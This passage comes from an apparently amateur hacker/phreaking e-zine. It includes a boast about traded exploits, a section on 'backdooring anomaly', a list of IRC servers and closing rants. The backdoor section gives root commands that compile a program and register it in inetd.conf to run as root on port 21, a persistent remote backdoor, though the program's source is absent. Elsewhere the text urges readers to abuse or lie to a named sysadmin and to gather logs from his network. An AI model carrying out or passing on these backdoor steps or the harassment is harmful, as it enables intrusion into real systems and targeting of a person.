many exploits that are not otherwise available on the internet. We
have sourced many of these by trading, honeypots and many other
methods.

This is how I obtained the illogic rootkit last year, I used our
honeynet. I of course now have many other exploits, primarily
focussing on remote exploits.

We are also looking for people to help us in trading, running
honeypots and so forth. If so just chat to us on the channel #p4k.

.::::::.[13] Backdooring Anomaly :::::::::::::::::::::::::::::. [Sangoma]

( gratuitous homosexuality: this is the none[sic] phreaking related section,
covering mostly irrelevant stuff like exploits that aren't actually exploits
that I say is the only interesting thing in this zine because I hate phreaking.
I think phreaking is crap and I'm saying that in a (supposed, mostly thanks to
me) phreaking zine because I am a fack-wit. Hacking and phreaking can go hand
in hand but I wouldn't know and I can't understand this c 5h17 anyway ;) )

Anomaly Backdoor
~~~~~~~~~~~~~~~~

Teh idea ov bakd00ring anomaly is faar from original. Teh cherrypopping credit
4 these should go to William Cilldhaire. Wot eye did waz 2 use teh ideaz 4 a
C++ thatz not C++ bakd00r, so these is only sort of plagiarism.

How It Works ?
~~~~~~~~~~~~~~

4 these b4kd00r, u must initialize it liek these :

porch# man gcc
porch# man gcc
porch# gcc anomaly.c -o anomaly
porch# man mv
porch# mv ./anomaly /bin/anomaly
porch# man cd
porch# cd /etc
porch# man inetd
porch# man echo
porch# man inetd
porch# echo "21 stream tcp nowait root /bin/anomaly /bin/anomaly" >> \
/etc/inetd.conf
porch# yes eye ame eleat!!

anomaly.c

They should count themselves lucky their mother's phone numbers are not listed

Because we can't use Phreaking 4 Kids any more due to our IRC and "hacking"
focus, we polled some readers for their ideas. This is what we came up with :

:: Linuxphreaks IRC Network Server List

This is where you go to get new material :

irc.mutox.org -- 203.219.138.225
irc.evilspud.com -- 203.219.15.100
quasar.linuxphreaks.org -- unknown host
irc.ikhaya.mutox.org -- 203.221.245.224

[  It's probably inevitable that the first thing good old weak-cheeba is gonna
start doing when people go on is ask how they knew about his uber-secret server
(*sigh* I know, but he still thinks third-rate Red Hat Linux sysadmining is an
underground black art), so do something like in [12] before you go on and say
that's how, preferably. Otherwise just get straight into the abuse or just
bullshit him, say you're someone else or say you got it off the nodedb site or
something.  ]

Well the time has come for another useless rant from me Head Rush. Now this
ezine is over, remember to get your old pal head rush some good logs from
linuxphreaks and remember to look on the bright side. The best thing about
this ezine being over is now we get to witness the running around like a
decapitated chicken conniption fit our members are invariably going to produce.

Peace out...
